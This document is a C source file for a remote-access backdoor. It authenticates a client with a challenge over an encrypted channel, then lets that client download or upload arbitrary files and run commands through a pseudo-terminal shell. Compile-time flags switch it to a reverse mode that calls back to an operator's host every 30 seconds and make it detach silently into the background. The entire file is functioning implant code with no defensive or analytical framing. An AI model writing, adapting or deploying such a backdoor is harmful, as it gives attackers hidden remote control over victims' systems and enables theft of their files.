#include <pty.h>
#include <sys/wait.h>
#include "app.h"
#include "connection.h"

char message[BUFSIZE + 5];
int msg_len;	

bool init_server(){
	byte IV[40];
	byte *IV1 = IV;
	byte *IV2 = IV + 20;
	recv_data(IV, 40, 0);
	//for(int i = 0; i < 40; ++i)
		//printf("%02x ", IV[i]);
	//printf("\n");
	setup_context(&send_ctx, key, IV2);
	setup_context(&recv_ctx, key, IV1);
	//printf("here\n");
	if(recv_msg(message, &msg_len) == FAILURE) return false;
	//printf("client.c:20\n");
	if(msg_len != 16 || memcmp(message, challenge, 0x10)) return false;
	//printf("Authen done\n");
	send_msg(challenge, 0x10);
	return true;
}

bool get_file(){
	char file_path[BUFSIZE + 5] = {0};
	char message[BUFSIZE + 5] = {0};
	int file_path_len;
	int fd;
	int i, sum = 0;
	struct stat s_buf;
	recv_msg(file_path, &file_path_len);
	//printf("%d\n", file_path_len);
	file_path[file_path_len] = '\0';
	stat(file_path, &s_buf);
	if(!S_ISREG(s_buf.st_mode)) return false;
	printf("%s\n", file_path);
	//can't find the specify file case
	if((fd = open(file_path, O_RDONLY)) < 0) return false;
	while(1){
		i = read(fd, message, BUFSIZE);
		//printf("%d\n", i);
		if(i <= 0) break;
		send_msg(message, i);
		sum += i;
	}
	close(fd);
	return true;
}

bool put_file(){
	int fd;
	int i, sum = 0;
	int file_path_len;
	int flag;
	char file_path[BUFSIZE + 5] = {0};
	recv_msg(file_path, &file_path_len);
	file_path[file_path_len] = '\0';
	//printf("%s\n", file_path);
	if((fd = creat(file_path, 0644)) < 0){
		printf("%d\n", fd);	
		return false; //to be perfected
	}
	while(1){	//to be perfected
		flag = recv_msg(message, &i);	//to be perfected
		//printf("%d\n", i);
		if(flag == false || i <= 0) break;
		if(write(fd, message, i) != i) return false; //exception handling;
		sum += i;
	}
	close(fd);
	return true;
}

bool run_shell(){
	fd_set rd;
	int pty, tty, pid;
	int tmp;
	int ret;
	if(openpty(&pty, &tty, NULL, NULL, NULL ) < 0)
		return false;
	if(recv_msg(message, &msg_len) == false) return false;
	message[msg_len] = '\0';
	//printf("%s\n", message);
	if((pid = fork()) < 0) return false;
	if(pid){
		close(tty);
		while(1){
			FD_ZERO(&rd);
			FD_SET(client, &rd);
			FD_SET(pty, &rd);
			tmp = (pty >= client ? pty : client);
			if(select(tmp + 1, &rd, NULL, NULL, NULL) < 0)
				return false;
			if(FD_ISSET(client, &rd)){
				ret = recv_msg(message, &msg_len);
				//printf("%d\n", ret);
				if(ret == 0) break;
				if(ret < 0) return false;
				//message[len] = '\0';
				//printf(">%s\n", message);
				write(pty, message, msg_len);
			}
			if(FD_ISSET(pty, &rd)){
				ret = read(pty, message, BUFSIZE);	//message length should less than BUFSIZEp
				//printf("%d\n", ret);
				if(ret <= 0) break;
				//if(ret < 0) return false;
				//printf("%d\n", len);
				send_msg(message, ret);
			}
		}
		//printf("here\n");
	}
	else{
		close(client);
		close(server);
		close(pty);
		if(setsid() < 0) return false;
		if( ioctl( tty, TIOCSCTTY, NULL ) < 0) return false;
		dup2( tty, 0 );
		dup2( tty, 1 );
		dup2( tty, 2 );
		if( tty > 2 ) close( tty );
		execl("/bin/sh", "sh", "-c", message, (char *)0);
		exit(0);
	}
	return true;
}

bool service(){
	struct sockaddr_in addr;
	int addr_len;
	char command_msg;
	int cmd_msg_len, flag;
	int pid;
	while(1){
#ifndef REVERSE
		//whether the output shoule be added
		if((client = accept(server, (struct sockaddr *)&addr, &addr_len)) < 0){
			close(server);
			return false;
		}
		pid = fork();
		if(pid < 0){
			close(client);
			continue;
		}
		if(pid > 0){
			waitpid(pid, NULL, 0);
			close(client);
			continue;
		}
#else
		struct sockaddr_in addr;
		sleep(30);
		if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			continue;
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = host;
		addr.sin_port = htons(port);
		if(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
			close( client );
			continue;
		}
#endif
		//printf("here\n");
		if(init_server() == FAILURE) return false;
		if(recv_msg(&command_msg, &cmd_msg_len) == FAILURE) return false;
		//printf("here\n");
		//printf("msg_len %d\n", msg_len);
		//printf("%02x\n", command_msg);
		switch(command_msg){
			case GET_FILE:flag = get_file();break;
			case PUT_FILE:flag = put_file();break;
			case RUN_SHELL:flag = run_shell();break;
			default:;
		}
		shutdown(client, 2);
		//if(flag == false) break;
		//printf("reset\n");
	}
	return true;
}

void usage(){
	printf("\t-f\tforward connection,default mode.\n");
	printf("\t-r\treverse connection.\n");
	printf("\t-i\tip address.\n");
	printf("\t-p\tport.\n");
	printf("\t-h\tprint help message.");
	exit(0);
}

int main(int argc, char *argv[]){
	int ch, pid, i;
#ifdef BACKGROUND
	pid = fork();
	if(pid < 0) return -1;
	if(pid > 0) return 0;
	if(setsid() < 0) return -1;
	for(i = 0; i < 1024; ++i) close(i);
#endif
	while((ch = getopt(argc, argv, "hi:p:")) != -1){
		switch(ch){
			case 'i':
				host = inet_addr(optarg);
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'h':
				usage();
				break;
			default:
				printf("Existence of unidentified parameters\n");
		}
	}
#ifndef REVERSE
	create_server_socket();
#endif
	service();
#ifndef REVERSE
	close(server);
#endif
	return 0;
}
